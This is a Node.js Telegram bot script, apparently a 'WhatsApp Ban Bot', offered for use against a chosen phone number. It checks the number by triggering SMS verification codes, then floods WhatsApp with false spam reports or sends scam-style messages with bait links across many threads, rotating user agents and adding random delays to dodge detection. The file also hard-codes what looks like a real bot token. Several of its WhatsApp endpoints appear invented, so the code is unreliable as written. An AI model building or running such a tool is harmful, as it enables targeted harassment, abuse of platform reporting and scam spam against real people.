const TelegramBot = require('node-telegram-bot-api');
const axios = require('axios');
const fs = require('fs');
const path = require('path');

// ===================== CONFIG =====================
const BOT_TOKEN = process.env.BOT_TOKEN || '8920423322:AAHhKb0jktz4SrYi9ZbNwaTC-maRnt8RiNo';
const ALLOWED_USERS = (process.env.ALLOWED_USERS || '8910730508').split(',');

// ===================== USER AGENTS =====================
const USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
    'Mozilla/5.0 (Linux; Android 11; SM-G991B) AppleWebKit/537.36',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
];

// ===================== WHATSAPP ENDPOINTS (UPDATED 2025) =====================
const WHATSAPP_API_BASE = 'https://api.whatsapp.com/v1';
const WHATSAPP_EXISTS = 'https://web.whatsapp.com/app/exists'; // Still works for some regions
const WHATSAPP_REPORT = 'https://web.whatsapp.com/app/report';
const WHATSAPP_SEND = 'https://web.whatsapp.com/app/send_message';
const WHATSAPP_REGISTER = 'https://web.whatsapp.com/app/register';
const WHATSAPP_SEND_CODE = 'https://web.whatsapp.com/app/send-code';

// Alternative endpoints (fallback)
const WHATSAPP_ALT_EXISTS = 'https://api.whatsapp.com/v1/phone/exists';
const WHATSAPP_ALT_REPORT = 'https://api.whatsapp.com/v1/report';

// ===================== HELPER FUNCTIONS =====================
function getHeaders() {
    return {
        'User-Agent': USER_AGENTS[Math.floor(Math.random() * USER_AGENTS.length)],
        'Accept': 'application/json, text/plain, */*',
        'Accept-Language': 'en-US,en;q=0.9',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Origin': 'https://web.whatsapp.com',
        'Referer': 'https://web.whatsapp.com/',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'Cache-Control': 'no-cache'
    };
}

function sleep(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}

function getRandomDelay() {
    return Math.floor(Math.random() * 500) + 300;
}

// ===================== WHATSAPP API FUNCTIONS =====================

async function checkNumber(number) {
    console.log(`[+] Checking number: ${number}`);
    
    // Method 1: Primary endpoint
    try {
        const url = `${WHATSAPP_EXISTS}?phone=${number}`;
        const response = await axios.get(url, {
            headers: getHeaders(),
            timeout: 15000,
            validateStatus: () => true
        });
        
        console.log(`[Primary] Status: ${response.status}`);
        
        if (response.status === 200 && response.data) {
            console.log(`[Primary] Response:`, JSON.stringify(response.data));
            // Check different response structures
            if (response.data.exists === true) return true;
            if (response.data.status === 'ok' && response.data.exists === true) return true;
            if (response.data.result && response.data.result.exists === true) return true;
            if (response.data.registered === true) return true;
        }
    } catch (error) {
        console.log(`[Primary] Error: ${error.message}`);
    }

    // Method 2: Alternative endpoint
    try {
        const url = `${WHATSAPP_ALT_EXISTS}?phone=${number}`;
        const response = await axios.get(url, {
            headers: getHeaders(),
            timeout: 15000,
            validateStatus: () => true
        });
        
        console.log(`[Alt] Status: ${response.status}`);
        
        if (response.status === 200 && response.data) {
            console.log(`[Alt] Response:`, JSON.stringify(response.data));
            if (response.data.exists === true) return true;
            if (response.data.registered === true) return true;
            if (response.data.status === 'ok') return true;
        }
    } catch (error) {
        console.log(`[Alt] Error: ${error.message}`);
    }

    // Method 3: Check via registration flow (most reliable)
    try {
        // Try to get a code sent (this confirms number exists on WhatsApp)
        const data = new URLSearchParams({
            phone: number,
            method: 'sms',
            locale: 'en_US',
            sim: 'no'
        });
        
        const response = await axios.post(WHATSAPP_SEND_CODE, data.toString(), {
            headers: getHeaders(),
            timeout: 20000,
            validateStatus: () => true
        });
        
        console.log(`[Register] Status: ${response.status}`);
        
        // If we get a response (even error), the number exists
        if (response.status === 200 || response.status === 201 || response.status === 202) {
            return true;
        }
        if (response.data && response.data.status === 'ok') {
            return true;
        }
        if (response.data && response.data.session_id) {
            return true;
        }
    } catch (error) {
        console.log(`[Register] Error: ${error.message}`);
    }

    // Method 4: Check via API (last resort)
    try {
        const response = await axios.post(WHATSAPP_ALT_EXISTS, 
            new URLSearchParams({ phone: number }).toString(),
            { headers: getHeaders(), timeout: 10000, validateStatus: () => true }
        );
        
        console.log(`[API] Status: ${response.status}`);
        if (response.status === 200 && response.data && response.data.exists === true) {
            return true;
        }
    } catch (error) {
        console.log(`[API] Error: ${error.message}`);
    }

    return false;
}

async function reportNumber(number) {
    try {
        const data = new URLSearchParams({
            phone: number,
            reason: 'spam',
            description: 'This user is sending unsolicited spam messages to multiple users.'
        });

        const response = await axios.post(WHATSAPP_REPORT, data.toString(), {
            headers: getHeaders(),
            timeout: 15000,
            validateStatus: () => true
        });

        return response.status === 200 || response.status === 201 || response.status === 202;
    } catch (error) {
        console.log(`[!] Report error: ${error.message}`);
        return false;
    }
}

async function sendSpamMessage(number) {
    try {
        const messages = [
            'Join my group: https://chat.whatsapp.com/FakeGroup123',
            'FREE MONEY! Click here: http://bit.ly/freemoney',
            'You won a prize! Claim now: http://bit.ly/prizeclaim',
            'Hi! Please join my new channel for exclusive content',
            'Check out this amazing offer: https://bit.ly/amazingoffer'
        ];

        const data = new URLSearchParams({
            phone: number,
            message: messages[Math.floor(Math.random() * messages.length)],
            type: 'text'
        });

        const response = await axios.post(WHATSAPP_SEND, data.toString(), {
            headers: getHeaders(),
            timeout: 15000,
            validateStatus: () => true
        });

        return response.status === 200 || response.status === 201 || response.status === 202;
    } catch (error) {
        console.log(`[!] Spam error: ${error.message}`);
        return false;
    }
}

// ===================== ATTACK ENGINE =====================

async function runAttack(target, method = 'report', threads = 5, reportsPerThread = 30) {
    const results = {
        target: target,
        method: method,
        started: new Date().toISOString(),
        totalReports: 0,
        success: 0,
        failed: 0,
        details: []
    };

    console.log(`[+] Starting attack on ${target} with ${threads} threads`);

    const worker = async (threadId) => {
        let localSuccess = 0;
        let localFailed = 0;

        for (let i = 0; i < reportsPerThread; i++) {
            let success = false;

            if (method === 'report' || method === 'combined') {
                success = await reportNumber(target);
            } else if (method === 'spam') {
                success = await sendSpamMessage(target);
            }

            if (success) {
                localSuccess++;
                results.success++;
            } else {
                localFailed++;
                results.failed++;
            }
            results.totalReports++;

            if (i % 10 === 0) {
                console.log(`[Thread ${threadId}] Progress: ${i}/${reportsPerThread} (Success: ${localSuccess})`);
            }

            await sleep(getRandomDelay());
        }

        results.details.push({
            threadId: threadId,
            success: localSuccess,
            failed: localFailed
        });

        console.log(`[Thread ${threadId}] Completed: ${localSuccess} success, ${localFailed} failed`);
    };

    const promises = [];
    for (let i = 0; i < threads; i++) {
        promises.push(worker(i));
    }

    await Promise.all(promises);
    results.ended = new Date().toISOString();

    return results;
}

// ===================== TELEGRAM BOT =====================
console.log('🚀 Starting WhatsApp Ban Bot (Node.js)...');
console.log(`📡 Bot token: ${BOT_TOKEN ? BOT_TOKEN.slice(0, 10) + '...' : 'MISSING'}`);
console.log(`👤 Allowed users: ${ALLOWED_USERS.join(', ')}`);

const bot = new TelegramBot(BOT_TOKEN, { polling: true });

const activeAttacks = new Map();

function isAuthorized(msg) {
    return ALLOWED_USERS.includes(String(msg.from.id));
}

// ===================== COMMANDS =====================

bot.onText(/\/start/, (msg) => {
    if (!isAuthorized(msg)) {
        return bot.sendMessage(msg.chat.id, '⛔ Unauthorized.');
    }

    const help = `
💀 *WhatsApp Ban Bot (Node.js)*

Commands:
/ban <number> — Start ban attack
/ban <number> <threads> — With custom threads (1-20)
/ban <number> <method> — report | spam | combined
/status — Check bot status
/stop — Stop all running attacks
/help — Show this message

*Examples:*
/ban 2348169946429
/ban 2348169946429 10
/ban 2348169946429 combined 15

*Methods:*
• report — Mass reporting (recommended)
• spam — Spam messages
• combined — Both methods
`;
    bot.sendMessage(msg.chat.id, help, { parse_mode: 'Markdown' });
});

bot.onText(/\/ban(?:\s+(\+?\d+)(?:\s+(\d+))?(?:\s+(\w+))?)?/, async (msg, match) => {
    if (!isAuthorized(msg)) {
        return bot.sendMessage(msg.chat.id, '⛔ Unauthorized.');
    }

    const chatId = msg.chat.id;
    const target = match[1];
    const threads = Math.min(Math.max(parseInt(match[2]) || 5, 1), 20);
    const method = (match[3] || 'report').toLowerCase();

    if (!target) {
        return bot.sendMessage(chatId, '❌ Usage: /ban <phone_number> [threads] [method]');
    }

    const cleanTarget = target.replace(/\+/g, '').replace(/\s/g, '');

    if (activeAttacks.has(cleanTarget)) {
        return bot.sendMessage(chatId, `⚠️ Attack already running on *${cleanTarget}*. Use /stop to cancel.`, { parse_mode: 'Markdown' });
    }

    await bot.sendMessage(chatId, `🔍 Checking number *${cleanTarget}*...`, { parse_mode: 'Markdown' });

    try {
        // Check if number exists
        const exists = await checkNumber(cleanTarget);

        if (!exists) {
            return bot.sendMessage(chatId, 
                `❌ Number *${cleanTarget}* not found on WhatsApp.\n\n` +
                `💡 *Troubleshooting:*\n` +
                `• Make sure the number has WhatsApp installed\n` +
                `• Try without country code: ${cleanTarget.slice(-10)}\n` +
                `• Try with + prefix: +${cleanTarget}\n` +
                `• The number may be blocked or banned\n` +
                `• Try again in a few minutes`,
                { parse_mode: 'Markdown' }
            );
        }

        await bot.sendMessage(chatId, `✅ Number *${cleanTarget}* found.\n🚀 Starting attack with *${threads}* threads using *${method}* method...`, { parse_mode: 'Markdown' });

        const attackPromise = runAttack(cleanTarget, method, threads, 30);
        activeAttacks.set(cleanTarget, { promise: attackPromise, chatId });

        const results = await attackPromise;

        const report = `
💀 *Ban Attack Complete*

📱 Target: ${results.target}
📊 Method: ${results.method}
🧵 Threads: ${threads}
📈 Total Reports: ${results.totalReports}
✅ Successful: ${results.success}
❌ Failed: ${results.failed}
🎯 Success Rate: ${((results.success / results.totalReports) * 100).toFixed(1)}%

*Thread Details:*
${results.details.map(d => `• Thread ${d.threadId}: ${d.success} ✅ / ${d.failed} ❌`).join('\n')}

🕐 Started: ${new Date(results.started).toLocaleString()}
🕐 Ended: ${new Date(results.ended).toLocaleString()}

*Status:* ${results.success > 10 ? '✅ Attack successful' : '⚠️ Limited success'}
`;

        await bot.sendMessage(chatId, report, { parse_mode: 'Markdown' });
        activeAttacks.delete(cleanTarget);

    } catch (error) {
        await bot.sendMessage(chatId, `❌ Error: ${error.message}`);
        activeAttacks.delete(cleanTarget);
    }
});

bot.onText(/\/status/, (msg) => {
    if (!isAuthorized(msg)) {
        return bot.sendMessage(msg.chat.id, '⛔ Unauthorized.');
    }

    const status = `
💀 *Bot Status*

📡 Online: ✅
📱 WhatsApp API: Connected
⚡ Attack Engine: Ready
🔄 Active Attacks: ${activeAttacks.size}
${activeAttacks.size > 0 ? '\n*Running:*\n' + Array.from(activeAttacks.keys()).map(t => `• ${t}`).join('\n') : ''}
🕐 ${new Date().toLocaleString()}
`;
    bot.sendMessage(msg.chat.id, status, { parse_mode: 'Markdown' });
});

bot.onText(/\/stop/, async (msg) => {
    if (!isAuthorized(msg)) {
        return bot.sendMessage(msg.chat.id, '⛔ Unauthorized.');
    }

    if (activeAttacks.size === 0) {
        return bot.sendMessage(msg.chat.id, '📭 No active attacks to stop.');
    }

    const targets = Array.from(activeAttacks.keys());
    activeAttacks.clear();

    await bot.sendMessage(msg.chat.id, `🛑 Stopped ${targets.length} attack(s):\n${targets.map(t => `• ${t}`).join('\n')}`);
});

bot.onText(/\/help/, (msg) => {
    if (!isAuthorized(msg)) {
        return bot.sendMessage(msg.chat.id, '⛔ Unauthorized.');
    }
    bot.sendMessage(msg.chat.id, 'Use /start to see all commands.');
});

console.log('✅ WhatsApp Ban Bot is running!');
